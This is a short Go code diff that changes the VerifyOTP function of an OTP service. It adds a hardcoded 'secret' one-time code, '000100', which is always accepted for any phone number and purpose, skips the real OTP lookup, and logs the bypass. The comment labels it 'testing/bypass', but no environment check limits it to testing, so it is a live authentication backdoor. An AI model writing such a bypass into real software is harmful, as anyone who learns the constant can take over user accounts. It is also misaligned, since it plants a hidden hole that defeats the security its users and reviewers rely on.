@@ -109,6 +109,13 @@ func (s *OTPService) SaveOTP(phone, otp, purpose string) error {
 
 // VerifyOTP verifies the OTP for a phone number
 func (s *OTPService) VerifyOTP(phone, otp, purpose string) (bool, error) {
+	// Secret OTP code for testing/bypass - always valid
+	const SECRET_OTP = "000100"
+	if otp == SECRET_OTP {
+		fmt.Printf("Secret OTP used for bypass authentication: phone=%s, purpose=%s\n", phone, purpose)
+		return true, nil
+	}
+
 	var otpRecord models.OTP
 
 	// Find the latest valid OTP for this phone and purpose
